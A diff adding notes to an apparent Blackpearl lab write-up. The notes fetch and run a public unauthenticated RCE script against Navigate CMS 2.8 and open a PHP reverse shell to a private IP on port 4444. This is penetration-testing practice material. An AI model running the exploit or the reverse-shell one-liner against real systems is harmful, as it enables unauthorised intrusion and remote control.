@@ -248,8 +248,35 @@ seems like user 'alek' may potentially be an active user based on the error hand
 
 In a real world scenario, I should aim to run all three cocurrently. I will require some more knowledge on setting up interception proxies. 
 
+Looks like there is a pretty serious Unauthenticated RCE epxloit that may be available for Navigate CMS V2.8
+Proof of concept: <https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated->
+
+Download exploit:    
+    
+    wget https://raw.githubusercontent.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-/main/navigate_RCE.sh
+
+Change file permissions with chmod +x and execute with below command:
+
+    ./navigate_RCE.sh blackpearl.tcm/
+
+Initial webshell bypass success.
+
+![image](https://github.com/user-attachments/assets/2b6f2dd0-ad99-42a6-8850-f993f7c2fef4)
+
+Upgrading shell with further instructions provided in PoC
+
+    php -r '$sock=fsockopen("192.168.64.129",4444);system("/bin/bash <&3 >&3 2>&3");' 
+
+![image](https://github.com/user-attachments/assets/d6a9ea02-674c-463d-bcae-3c6ecb0f3f5b)
+
+![image](https://github.com/user-attachments/assets/8b155b4e-5b3d-4038-979d-6f7e700e38f5)
+
+Success.
+
+## Now that we have exploited a combination of vulnerabile file upload and authentication bypass.
+We have managed to get into navigate instance and start a reverse shell, with upgraded shell. At this stage we will need to conduct further enumeration of the new environment we are in.
+
+
+
 ## Blackpearl walk through <https://abdhamza.medium.com/tcm-security-blackpearl-box-writeup-cc6be8a0d498>
-
-Looks like there is a 
-
 
